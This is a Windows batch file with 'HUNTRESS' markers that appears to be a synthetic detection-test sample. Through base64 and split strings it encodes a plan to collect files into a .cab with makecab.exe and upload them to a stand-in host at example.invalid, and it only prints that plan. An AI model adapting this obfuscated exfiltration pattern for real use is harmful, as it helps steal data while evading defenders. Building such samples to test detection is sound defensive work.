@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:base64_literal|identity

rem HUNTRESS-MATERIAL:dj0xfHN0ZXBzPWxvY2F0ZV9sb2NhbCxwcmVwYXJlX3RyYW5zZmVyLHVwbG9hZF9yZW1vdGV8YWRhcHRlcj1tYWtlY2FiLmV4ZXxzdGFnZV9jb3VudD0xfGdyYXBoPWxpbmVhcnxuZXh0X2xhbmd1YWdlPW5vbmV8Y2FtcGFpZ25faWQ9Y2FtcGFpZ24tNmMyMjcyNzFiZXxzb3VyY2VfcGF0aD1DOlxVc2Vyc1xQdWJsaWNcSHVudHJlc3NMYWJcY29sbGVjdC02YzIyNzI3MWJlLmNhYnx1cGxvYWRfdXJsPWh0dHBzOi8vNmMyMjcyNzFiZS5leGFtcGxlLmludmFsaWQvdXBsb2Fk

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "v_a0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"& rem HUNTRESS quote compound
set "v_a1=ab.exe|stage_count=1|graph=linear|next_language=none|campaign_id=ca"& rem HUNTRESS quote compound
set "v_a2=mpaign-6c227271be|source_path=C:\Users\Public\HuntressLab\collect-6"& rem HUNTRESS quote compound
set "v_a3=c227271be.cab|upload_url=https://6c227271be.example.invalid/upload"& rem HUNTRESS quote compound

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_string_join=1f4e5619"

set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%v_a%%G%%"

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-6c227271be.cab to https://6c227271be.example.invalid/upload

exit /b 0

